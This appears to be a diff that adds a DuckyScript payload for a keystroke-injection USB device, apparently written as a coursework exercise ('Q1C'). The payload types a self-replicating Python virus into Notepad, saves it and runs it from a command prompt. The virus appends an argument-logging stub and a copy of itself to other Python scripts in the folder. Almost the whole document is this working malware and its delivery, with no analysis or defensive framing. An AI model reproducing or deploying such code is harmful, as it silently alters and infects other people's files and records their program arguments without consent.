@@ -1,0 +1,131 @@
+DELAY 2000
+GUI r
+DELAY 1000
+STRING notepad
+ENTER
+DELAY 2000
+STRING import sys, os
+ENTER
+ENTER
+STRING directory = os.listdir(path=".")
+ENTER
+ENTER
+STRING pythonFiles = []
+ENTER
+STRING for f in directory:
+ENTER
+TAB
+STRING if ".py" in f:
+ENTER
+TAB
+TAB
+STRING pythonFiles.append(f)
+ENTER
+ENTER
+STRING for pyfile in pythonFiles:
+ENTER
+TAB
+STRING hasVirus = False
+ENTER
+TAB
+STRING isScript = False
+ENTER
+TAB
+STRING myfile = open(pyfile, "r")
+ENTER
+TAB
+STRING lines = [i.strip() for i in myfile.readlines()]
+ENTER
+ENTER
+TAB
+STRING if "if __name__ == \"__main__\":" in lines:
+ENTER
+TAB
+TAB
+STRING isScript = True
+ENTER
+ENTER
+TAB
+STRING for line in lines:
+ENTER
+TAB
+TAB
+STRING if "virus" in line:
+ENTER
+TAB
+TAB
+TAB
+STRING hasVirus = True
+ENTER
+ENTER
+TAB
+STRING myfile.close()
+ENTER
+ENTER
+TAB
+STRING writefile = open(pyfile, "a+")
+ENTER
+TAB
+STRING addonFile = open("Q1C.py", "r")
+ENTER
+TAB
+STRING virusList = ["\n#virus", "\nimport sys", "\nvirusfile = open(\"Q1C.out\", \"a+\")", "\nfor i in sys.argv: virusfile.write(i + ' ')", "\nvirusfile.write(\"\\n\")", "\nvirusfile.close()"]
+ENTER
+ENTER
+TAB
+STRING if isScript and not hasVirus:
+ENTER
+TAB
+TAB
+STRING for line in virusList:
+ENTER
+TAB
+TAB
+TAB
+STRING writefile.write(line)
+ENTER
+ENTER
+TAB
+TAB
+STRING writefile.write("\n\n")
+ENTER
+TAB
+TAB
+STRING addonLines = addonFile.readlines()
+ENTER
+ENTER
+TAB
+TAB
+STRING for line in addonLines:
+ENTER
+TAB
+TAB
+TAB
+STRING writefile.write(line)
+ENTER
+ENTER
+TAB
+STRING addonFile.close()
+ENTER
+TAB
+STRING writefile.close()
+ENTER
+DELAY 1000
+CTRL s
+DELAY 500
+STRING Q1C.py
+ENTER
+DELAY 1000
+CTRL w
+DELAY 1000
+GUI r
+ENTER
+DELAY 1000
+STRING cmd
+ENTER
+DELAY 2000
+STRING cd OneDrive\Documents
+ENTER
+DELAY 500
+STRING python3.10 q1c.py
+ENTER
